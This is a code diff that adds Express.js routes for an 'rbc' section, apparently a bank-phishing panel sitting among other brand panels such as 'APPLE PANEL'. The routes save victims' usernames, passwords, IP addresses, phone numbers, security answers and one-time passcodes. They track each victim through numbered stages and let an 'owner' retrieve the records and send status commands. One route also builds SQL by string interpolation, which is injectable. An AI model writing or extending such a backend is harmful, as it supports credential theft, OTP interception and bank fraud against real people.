@@ -2028,6 +2028,159 @@ app.post("/zcSaveLogin", cors(), (req, res) => {
   res.send("Completed");
 });
 
+//RBC
+//RBC
+//RBC
+
+app.options("/rbcCustomers/:id/:owner/modal", cors());
+
+app.get("/rbcCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM rbc WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/rbcCustomers/:owner", cors());
+
+app.get("/rbcCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM rbc WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/rbcCommand", cors());
+
+app.post("/rbcCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+  let query = `UPDATE rbc SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+  panelConnection.query(query, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/rbcCustomers/:id/:owner", cors());
+
+app.get("/rbcCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM rbc WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/rbcSaveLogin", cors());
+
+app.post("/rbcSaveLogin", cors(), (req, res) => {
+  username = req.body.username;
+  password = req.body.password;
+  ip = req.body.ip;
+  owner = req.body.owner;
+  uniqueid = req.body.uniqueid;
+
+  let details = [username, password, uniqueid, ip, owner];
+  let query = `INSERT INTO rbc(username,password,uniqueid,status,ip,owner) VALUES (?,?,?,1,?,?)`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/rbcSaveTelephone", cors());
+
+app.post("/rbcSaveTelephone", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  telephone = req.body.telephone;
+
+  let details = [telephone, uniqueid];
+  let query = `UPDATE rbc SET telephone= ?, status = 2 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/rbcSaveQuestion", cors());
+
+app.post("/rbcSaveQuestion", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  answer = req.body.answer;
+
+  let details = [answer, uniqueid];
+  let query = `UPDATE rbc SET answer= ?, status = 5 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/rbcSaveOtp", cors());
+
+app.post("/rbcSaveOtp", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  otp = req.body.otp;
+
+  let details = [otp, uniqueid];
+  let query = `UPDATE rbc SET otp= ?, status = 3 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/rbcSaveLoginAgain", cors());
+
+app.post("/rbcSaveLoginAgain", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  username = req.body.username;
+  password = req.body.password;
+
+  let details = [username, password, uniqueid];
+  let query = `UPDATE rbc SET username= ?, password= ?, status = 7 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/rbcDeleteentry/:id", cors());
+
+app.post("/rbcDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM rbc WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
 //APPLE PANEL
 //APPLE PANEL
 //APPLE PANEL
